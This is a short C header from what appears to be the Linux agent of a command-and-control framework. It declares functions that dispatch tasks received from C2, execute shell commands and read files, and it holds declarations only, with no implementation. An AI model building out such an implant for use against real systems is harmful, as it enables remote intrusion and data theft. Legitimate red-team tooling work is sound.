// linux-agent/include/tasks_linux.h
#pragma once
#include <stddef.h>

// Dispatch a task received from C2
void dispatch_task_linux(const unsigned char* data, size_t len);

// Execute a shell command and return output
int task_shell_exec(const char* cmd, char** output, size_t* output_len);

// Read a file and return contents
int task_file_read(const char* path, char** output, size_t* output_len);
